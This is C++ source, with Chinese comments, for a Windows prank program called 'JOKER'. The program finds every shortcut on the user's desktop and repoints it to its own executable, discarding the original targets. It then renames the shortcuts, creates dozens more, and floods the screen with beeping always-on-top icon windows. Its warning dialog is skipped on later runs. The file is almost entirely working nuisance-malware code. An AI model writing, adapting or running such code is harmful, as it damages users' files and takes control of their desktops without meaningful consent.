#include <iostream>
#include <Windows.h>
#include <combaseapi.h>
#include <ShObjIdl_core.h>
#include <fcntl.h>
#include <io.h>
#include <Shlwapi.h>
#include <ShlObj.h>


// 库依赖
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "Shlwapi.lib")

//=======================全局变量===================================
IShellLinkW* pShellLink = nullptr;
IPersistFile* pPersist = nullptr;
int oldStdinMode;
int oldStdoutMode;
HICON g_hIcon = NULL;


//=======================参数声明===================================
int Take_Tool();
void Release_Tool();
BOOL Rename_Lnk_AutoName(WCHAR* Old_Path_Lnk, WCHAR* New_Name);
BOOL Edit_Lnk(WCHAR* Path_Lnk, WCHAR* New_Path_EXE, WCHAR* Path_ICO, WCHAR* New_Path_Lnk);

//=======================函数声明===================================
//设置输出输入的格式
VOID SetInput_A_To_W();
VOID SetInput_W_To_A();

//获取文件夹路径
PWSTR GetDesktopPath();

// 打印指定目录下的 .lnk 文件完整路径
BOOL Print_All_LnkFiles(LPCWSTR folderPath, WCHAR*** Path_Table, int* outCount);

//获取程序自身绝对路径函数，把路径写到Self_Path
BOOL GetMyselfPath(WCHAR* Self_Path);

//获取本程序目录下的ico图片
BOOL GetIcoPath(WCHAR* outPath, DWORD size);

//检测密钥
BOOL CheckTheKey();

//检查
BOOL Check_JOKER(WCHAR* Str);

//创建lnk
void Create_Lnk(WCHAR* exePath, WCHAR* description, WCHAR* lnkPath);

// 核心函数
void CreateRandomIconWindows(int count);

bool IsFirstRun();

//========================主程序=======================================
int WINAPI WinMain(HINSTANCE hInstance,  HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow )
{

    if (!IsFirstRun())
    {
        CreateRandomIconWindows(50);
    }

    //设置启动密钥，防止误伤
    if (!CheckTheKey())
    {
        return 0;
    }
    //拿到工具
    if (!Take_Tool())
    {
        return 0;
    }

    //获取程序自身绝对路径
    WCHAR* My_Path = (WCHAR*)malloc(sizeof(WCHAR) * MAX_PATH);
    GetMyselfPath(My_Path);

    //获取文件夹路径
    PWSTR pDesktopPath = nullptr;
    pDesktopPath = GetDesktopPath();

    if (pDesktopPath == nullptr)
    {
        return -1;
    }

    //获取快捷方式
    WCHAR** table = NULL;
    int count = 0;

    Print_All_LnkFiles(pDesktopPath, &table, &count);

    //修改lnk文件
    int shuliang = 0;
    for (int i = 0; i < count; i++)
    {
        if (!Check_JOKER(table[i]))
        {
            continue;
        }
        shuliang++;
        WCHAR New_Name[50] = { 0 };
        swprintf_s(
            New_Name,
            50,
            L"JOKER_%d",
            shuliang
        );

        Edit_Lnk(
            table[i],
            My_Path,
            My_Path,
            New_Name
        );
    }

    //多创建几个lnk
    for (int i = shuliang;i < 50;i++)
    {
        WCHAR Weizhi[MAX_PATH * 2] = { 0 };
        wcscpy_s(Weizhi, MAX_PATH * 2, pDesktopPath);
        WCHAR New_Name[50] = { 0 };
        swprintf_s(
            New_Name,
            50,
            L"JOKER_%d",
            i
        );
        wcscat_s(Weizhi, MAX_PATH * 2, L"\\");
        wcscat_s(Weizhi, MAX_PATH * 2, New_Name);
        wcscat_s(Weizhi, MAX_PATH * 2, L".lnk");
        Create_Lnk(My_Path, (WCHAR*)L"This is a JOKER file", Weizhi);
    }

    //释放资源
    for (int i = 0; i < count; i++)
    {
        free(table[i]);
    }

    free(table);
    free(My_Path);

    CoTaskMemFree(pDesktopPath);
    pDesktopPath = nullptr;

    //释放工具
    Release_Tool();

    //随机打印图片
    CreateRandomIconWindows(50);

    return 0;
}

//=======================函数实现======================================

int Take_Tool()
{
    // 1. 初始化COM
    CoInitialize(NULL);

    // 创建ShellLink COM对象
    HRESULT hr = CoCreateInstance(
        CLSID_ShellLink,
        NULL,
        CLSCTX_INPROC_SERVER,
        IID_IShellLinkW,
        (void**)&pShellLink
    );

    if (!SUCCEEDED(hr))
    {
        CoUninitialize();
        return 0;
    }

    // 获取文件读写接口
    hr = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersist);

    if (!SUCCEEDED(hr))
    {
        pShellLink->Release();
        CoUninitialize();
        return 0;
    }

    return 1;
}

void Release_Tool()
{
    CoUninitialize();

    if (pPersist)
    {
        pPersist->Release();
        pPersist = nullptr;
    }

    if (pShellLink)
    {
        pShellLink->Release();
        pShellLink = nullptr;
    }
}

BOOL Rename_Lnk_AutoName(WCHAR* Old_Path_Lnk, WCHAR* New_Name)
{
    WCHAR New_Path[MAX_PATH] = { 0 };

    // 1. 复制旧路径
    wcscpy_s(New_Path, Old_Path_Lnk);

    // 2. 去掉文件名，只保留目录
    PathRemoveFileSpecW(New_Path);

    // 3. 拼接新的名字 + .lnk
    wcscat_s(New_Path, L"\\");
    wcscat_s(New_Path, New_Name);
    wcscat_s(New_Path, L".lnk");

    // 4. 改名
    if (!MoveFileW(Old_Path_Lnk, New_Path))
    {
        return FALSE;
    }

    return TRUE;
}

BOOL Edit_Lnk(WCHAR* Path_Lnk, WCHAR* New_Path_EXE, WCHAR* Path_ICO, WCHAR* New_Path_Lnk)
{
    HRESULT hr;

    // 1.读取lnk文件
    hr = pPersist->Load(Path_Lnk, STGM_READ);

    if (!SUCCEEDED(hr))
    {
        return 0;
    }

    // 2.修改目标路径
    hr = pShellLink->SetPath(New_Path_EXE);

    if (!SUCCEEDED(hr))
    {
        return 0;
    }

    // 3.修改图标
    hr = pShellLink->SetIconLocation(
        Path_ICO,
        0
    );

    if (!SUCCEEDED(hr))
    {
        return 0;
    }

    // 4.保存lnk
    hr = pPersist->Save(
        Path_Lnk,
        TRUE
    );

    if (!SUCCEEDED(hr))
    {
        return 0;
    }

    if (!Rename_Lnk_AutoName(Path_Lnk, New_Path_Lnk))
    {
        return 0;
    }

    // 强制刷新图标缓存
    SHChangeNotify(
        SHCNE_ASSOCCHANGED,
        SHCNF_IDLIST,
        NULL,
        NULL
    );

    return 1;
}

PWSTR GetDesktopPath()
{
    PWSTR path = nullptr;

    if (FAILED(SHGetKnownFolderPath(
        FOLDERID_Desktop,
        0,
        NULL,
        &path)))
    {
        return nullptr;
    }

    return path;
}

VOID SetInput_A_To_W()
{
    oldStdinMode = _setmode(_fileno(stdin), _O_WTEXT);
    oldStdoutMode = _setmode(_fileno(stdout), _O_WTEXT);
}

VOID SetInput_W_To_A()
{
    oldStdinMode = _setmode(_fileno(stdin), oldStdinMode);
    oldStdoutMode = _setmode(_fileno(stdout), oldStdoutMode);
}

BOOL Print_All_LnkFiles(LPCWSTR folderPath, WCHAR*** Path_Table, int* outCount)
{
    if (!folderPath || !Path_Table || !outCount)
        return FALSE;

    *Path_Table = NULL;
    *outCount = 0;

    int capacity = 16;
    int count = 0;

    WCHAR** table = (WCHAR**)malloc(sizeof(WCHAR*) * capacity);

    if (!table)
        return FALSE;

    WCHAR searchPath[MAX_PATH];

    swprintf_s(searchPath, L"%ls\\*.lnk", folderPath);

    WIN32_FIND_DATAW findData;

    HANDLE hFind = FindFirstFileW(searchPath, &findData);

    if (hFind == INVALID_HANDLE_VALUE)
    {
        free(table);
        return FALSE;
    }

    do
    {
        if (wcscmp(findData.cFileName, L".") == 0 ||
            wcscmp(findData.cFileName, L"..") == 0)
        {
            continue;
        }

        WCHAR fullPath[MAX_PATH];

        swprintf_s(fullPath, L"%ls\\%ls", folderPath, findData.cFileName);

        // 扩容
        if (count >= capacity)
        {
            capacity *= 2;

            WCHAR** newTable = (WCHAR**)realloc(
                table,
                sizeof(WCHAR*) * capacity
            );

            if (!newTable)
            {
                for (int i = 0; i < count; i++)
                {
                    free(table[i]);
                }

                free(table);
                FindClose(hFind);
                return FALSE;
            }

            table = newTable;
        }

        // 分配并拷贝字符串
        size_t len = wcslen(fullPath) + 1;

        table[count] = (WCHAR*)malloc(sizeof(WCHAR) * len);

        if (!table[count])
            continue;

        wcscpy_s(table[count], len, fullPath);

        count++;

    } while (FindNextFileW(hFind, &findData));

    FindClose(hFind);

    *Path_Table = table;
    *outCount = count;

    return TRUE;
}

BOOL GetMyselfPath(WCHAR* Self_Path)
{
    if (!GetModuleFileNameW(
        NULL,
        Self_Path,
        MAX_PATH
    ))
    {
        return 0;
    }

    return 1;
}

BOOL GetIcoPath(WCHAR* outPath, DWORD size)
{
    WCHAR myPath[MAX_PATH] = { 0 };

    // 1. 获取程序自身完整路径
    if (!GetModuleFileNameW(NULL, myPath, MAX_PATH))
        return FALSE;

    // 2. 去掉文件名，只保留目录
    WCHAR* lastSlash = wcsrchr(myPath, L'\\');

    if (!lastSlash)
        return FALSE;

    *(lastSlash + 1) = L'\0';

    // 3. 拼接 ico 文件
    swprintf_s(outPath, size, L"%sJOKER4.ico", myPath);

    return TRUE;
}

BOOL CheckTheKey()
{
    int result = MessageBoxW(
        NULL,
        L"准备好了吗？会有点危险哦！",
        L"JOKER",
        MB_OKCANCEL | MB_ICONWARNING | MB_TOPMOST
    );

    return (result == IDOK);
}

BOOL Check_JOKER(WCHAR* Str)
{
    if (Str == NULL)
    {
        return 1;
    }

    // 查找是否包含 "JOKER"
    if (wcsstr(Str, L"JOKER"))
    {
        return 0;
    }

    return 1;
}

void Create_Lnk(WCHAR* exePath, WCHAR* description, WCHAR* lnkPath)
{
    HRESULT hr = S_OK;
    IPersistFile* pFile = nullptr;

    // 设置快捷方式目标
    pShellLink->SetPath(exePath);

    // 设置图标
    pShellLink->SetIconLocation(exePath, 0);

    // ===== 计算工作目录 =====
    WCHAR workDir[MAX_PATH] = { 0 };
    wcscpy_s(workDir, MAX_PATH, exePath);

    wchar_t* lastSlash = wcsrchr(workDir, L'\\');

    if (lastSlash)
    {
        *(lastSlash + 1) = L'\0';  // 保留目录路径
    }

    // 设置工作目录
    pShellLink->SetWorkingDirectory(workDir);

    // 设置描述
    pShellLink->SetDescription(description);

    // 获取保存接口
    hr = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pFile);

    if (SUCCEEDED(hr))
    {
        pFile->Save(lnkPath, TRUE);
        pFile->Release();
    }
}

void CreateRandomIconWindows(int count)
{
    char path[MAX_PATH];

    // 获取当前 EXE 路径
    GetModuleFileNameA(NULL, path, MAX_PATH);

    // 提取当前 EXE 图标
    g_hIcon = ExtractIconA(NULL, path, 0);

    srand((unsigned)time(NULL) ^ GetTickCount64());

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    for (int i = 0; i < count; i++)
    {
        // 随机图标大小
        int size = 50;

        int x = rand() % (sw - size);
        int y = rand() % (sh - size);

        HWND hwnd = CreateWindowExW(
            WS_EX_TOPMOST,
            L"STATIC",
            NULL,
            WS_VISIBLE | WS_POPUP | SS_ICON,
            x,
            y,
            size,
            size,
            NULL,
            NULL,
            GetModuleHandle(NULL),
            NULL
        );

        // 设置图标
        SendMessage(hwnd, STM_SETICON, (WPARAM)g_hIcon, 0);

        // 响声
        Beep(3000, 100);

        Sleep(10);
    }

    // 消息循环
    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

bool IsFirstRun()
{
    const char* fileName = "ru.flag";

    DWORD attr = GetFileAttributesA(fileName);

    if (attr == INVALID_FILE_ATTRIBUTES)
    {
        HANDLE hFile = CreateFileA(
            fileName,
            GENERIC_WRITE,
            0,
            NULL,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );

        if (hFile != INVALID_HANDLE_VALUE)
        {
            CloseHandle(hFile);
        }

        return true;
    }

    return false;
}
